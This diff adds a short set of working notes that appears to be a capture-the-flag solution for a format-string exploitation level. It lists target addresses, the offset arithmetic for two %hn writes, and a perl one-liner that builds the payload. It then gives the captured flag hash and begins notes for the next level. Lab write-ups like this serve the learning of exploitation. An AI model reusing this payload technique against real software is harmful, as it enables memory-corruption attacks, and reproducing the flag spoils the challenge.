@@ -1,0 +1,28 @@
+0x0804850f
+
+
+0x080484f8 < retour après printf
+
+
+address to go : 0x080484a4
+
+address to manipulate : 0x08049838
+
+0x0804983a -> 0804  (2052)	-> (2052)
+0x08049838 -> 84a4  (33956)	-> (31904)
+
+[\x3a\x98\x04\x08][BBBB][\x38\x98\x04\x08][%c%c]["%2038d"]["%hn"]["%31904d"]["%hn"]
+
+perl -e 'print "\x3a\x98\x04\x08"."BBBB"."\x38\x98\x04\x08"."%c%c%2038d%hn%31904d%hn"' > /tmp/payload_5
+
+
+flag d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
+
+
+
+
+level 6 :
+
+0x08048468
+
+
